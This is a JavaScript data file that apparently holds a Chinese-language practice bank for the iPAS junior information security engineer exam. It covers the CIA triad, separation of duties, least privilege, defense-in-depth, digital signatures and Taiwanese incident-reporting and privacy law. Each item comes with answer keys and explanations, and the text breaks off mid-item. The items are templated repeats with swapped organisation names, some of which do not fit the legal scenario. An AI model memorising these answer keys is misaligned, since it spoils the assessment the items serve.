// iPAS 資訊安全工程師 - 初級 800 題完整情境解析題庫
window.IPAS_QUESTIONS_BASIC = [
  {
    "id": "IPAS-B-001",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 權限分立（SoD）與帳號鑑別性",
      "B. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "C. 隱私性（Privacy）與可用性（Availability）",
      "D. 可用性（Availability）與完整性（Integrity）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-002",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某知名大型網路電商平台在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 業務持續運作原則",
      "B. 帳號不可共用原則",
      "C. 職責區隔（Separation of Duties, SoD）",
      "D. 最小權限原則（Least Privilege）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-003",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 單一簽入（Single Sign-On）",
      "B. 零信任架構（Zero Trust）",
      "C. 最小特權（Least Privilege）",
      "D. 縱深防禦（Defense-in-Depth）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-004",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某高科技晶圓代工大廠的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 對稱式 AES-256 加密",
      "B. 單向雜湊 SHA-256",
      "C. 傳輸層 TLS 加密",
      "D. 數位簽章（Digital Signature）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-005",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某知名大型網路電商平台（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 24 小時內",
      "B. 72 小時內",
      "C. 36 小時內",
      "D. 1 小時內"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-006",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 只要召開記者會道歉即可免責",
      "B. 僅需向警政署報案，無需通知當事人",
      "C. 應查明後以適當方式及時通知當事人",
      "D. 必須於 1 小時內向法院提起訴訟"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-007",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. 跨網站腳本攻擊（XSS）",
      "B. SQL 注入攻擊（SQLi）",
      "C. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-008",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第二階：程序 / 管理辦法（Procedure / Standard）",
      "B. 第三階：作業指引（Work Instruction）",
      "C. 第一階：資安政策（Policy）",
      "D. 第四階：表單紀錄（Record）"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-009",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某區域教學醫學中心新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 責任不可分原則",
      "B. 最小權限原則（Principle of Least Privilege）",
      "C. 開放權限原則",
      "D. 縱深防禦原則"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-010",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 單點容錯機制",
      "B. 帳號共用機制",
      "C. 職責區隔（Separation of Duties）",
      "D. 雙因子認證機制"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-011",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 隱私性（Privacy）與可用性（Availability）",
      "B. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "C. 可用性（Availability）與完整性（Integrity）",
      "D. 權限分立（SoD）與帳號鑑別性"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-012",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 帳號不可共用原則",
      "B. 業務持續運作原則",
      "C. 最小權限原則（Least Privilege）",
      "D. 職責區隔（Separation of Duties, SoD）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-013",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 縱深防禦（Defense-in-Depth）",
      "B. 零信任架構（Zero Trust）",
      "C. 單一簽入（Single Sign-On）",
      "D. 最小特權（Least Privilege）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-014",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國立頂尖研究型大學的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 傳輸層 TLS 加密",
      "B. 數位簽章（Digital Signature）",
      "C. 單向雜湊 SHA-256",
      "D. 對稱式 AES-256 加密"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-015",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某高科技晶圓代工大廠（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 36 小時內",
      "B. 1 小時內",
      "C. 72 小時內",
      "D. 24 小時內"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-016",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某知名大型網路電商平台的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 必須於 1 小時內向法院提起訴訟",
      "B. 只要召開記者會道歉即可免責",
      "C. 僅需向警政署報案，無需通知當事人",
      "D. 應查明後以適當方式及時通知當事人"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-017",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某金流與行動支付科技公司為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
    "options": [
      "A. SQL 注入攻擊（SQLi）",
      "B. 跨網站腳本攻擊（XSS）",
      "C. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）",
      "D. 緩衝區溢位攻擊（Buffer Overflow）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "XSS",
        "zh": "跨網站腳本攻擊",
        "ipa": "/ˌeks.esˈes/"
      },
      {
        "en": "Buffer Overflow",
        "zh": "緩衝區溢位",
        "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"
      }
    ],
    "explanation": "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
    "trap": "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。",
    "law": "刑事警察局高司防詐指南"
  },
  {
    "id": "IPAS-B-018",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
    "options": [
      "A. 第二階：程序 / 管理辦法（Procedure / Standard）",
      "B. 第四階：表單紀錄（Record）",
      "C. 第三階：作業指引（Work Instruction）",
      "D. 第一階：資安政策（Policy）"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
    "trap": "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。",
    "law": "ISO/IEC 27001 文件化資訊規範"
  },
  {
    "id": "IPAS-B-019",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
    "options": [
      "A. 縱深防禦原則",
      "B. 開放權限原則",
      "C. 責任不可分原則",
      "D. 最小權限原則（Principle of Least Privilege）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      }
    ],
    "explanation": "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
    "trap": "指派過高權限將大幅增加憑證被竊後的橫向移動風險。",
    "law": "NIST SP 800-12"
  },
  {
    "id": "IPAS-B-020",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？",
    "options": [
      "A. 單點容錯機制",
      "B. 雙因子認證機制",
      "C. 職責區隔（Separation of Duties）",
      "D. 帳號共用機制"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
    "trap": "這是內部控制與稽核的核心要求。",
    "law": "公開發行公司建立內部控制制度處理準則"
  },
  {
    "id": "IPAS-B-021",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某大型連鎖量販流通集團近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
    "options": [
      "A. 機密性（Confidentiality）與不可否認性（Non-Repudiation）",
      "B. 可用性（Availability）與完整性（Integrity）",
      "C. 隱私性（Privacy）與可用性（Availability）",
      "D. 權限分立（SoD）與帳號鑑別性"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CIA Triad",
        "zh": "資安三要素 (機密性/完整性/可用性)",
        "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"
      },
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "Availability",
        "zh": "可用性",
        "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"
      },
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      }
    ],
    "explanation": "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
    "trap": "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。",
    "law": "《資通安全管理法》、ISO/IEC 27001"
  },
  {
    "id": "IPAS-B-022",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某公務機關資訊處在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
    "options": [
      "A. 最小權限原則（Least Privilege）",
      "B. 業務持續運作原則",
      "C. 職責區隔（Separation of Duties, SoD）",
      "D. 帳號不可共用原則"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Separation of Duties",
        "zh": "職責區隔 / 權限分立",
        "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"
      }
    ],
    "explanation": "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
    "trap": "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。",
    "law": "ISO/IEC 27001 A.5.3 職責區隔"
  },
  {
    "id": "IPAS-B-023",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某高科技晶圓代工大廠計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
    "options": [
      "A. 縱深防禦（Defense-in-Depth）",
      "B. 單一簽入（Single Sign-On）",
      "C. 零信任架構（Zero Trust）",
      "D. 最小特權（Least Privilege）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Defense-in-Depth",
        "zh": "縱深防禦",
        "ipa": "/dɪˈfens ɪn depθ/"
      },
      {
        "en": "Least Privilege",
        "zh": "最小權限原則",
        "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"
      },
      {
        "en": "Zero Trust",
        "zh": "零信任架構",
        "ipa": "/ˈzɪr.oʊ trʌst/"
      }
    ],
    "explanation": "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
    "trap": "零信任強調動態驗證，縱深防禦強調多層次防線疊加。",
    "law": "NIST SP 800-53"
  },
  {
    "id": "IPAS-B-024",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某跨國金融控股銀行的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
    "options": [
      "A. 數位簽章（Digital Signature）",
      "B. 傳輸層 TLS 加密",
      "C. 單向雜湊 SHA-256",
      "D. 對稱式 AES-256 加密"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Non-Repudiation",
        "zh": "不可否認性",
        "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
    "trap": "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。",
    "law": "《電子簽章法》第4條"
  },
  {
    "id": "IPAS-B-025",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "依據我國《資通安全管理法》之規定，某知名大型網路電商平台（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
    "options": [
      "A. 1 小時內",
      "B. 36 小時內",
      "C. 24 小時內",
      "D. 72 小時內"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
    "trap": "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。",
    "law": "《資通安全事件通報及應變辦法》第5條"
  },
  {
    "id": "IPAS-B-026",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "資安核心原則、法規與隱私基礎",
    "scenario": true,
    "question": "某區域教學醫學中心的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
    "options": [
      "A. 僅需向警政署報案，無需通知當事人",
      "B. 必須於 1 小時內向法院提起訴訟",
      "C. 應查明後以適當方式及時通知當事人",
      "D. 只要召開記者會道歉即可免責"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
    "trap": "通知當事人為法定義務，不得以內部保密為由隱瞞不報。",
    "law": "《個人資料保護法》第12條"
  },
  {
    "id": "IPAS-B-027",
    "level": "初級",
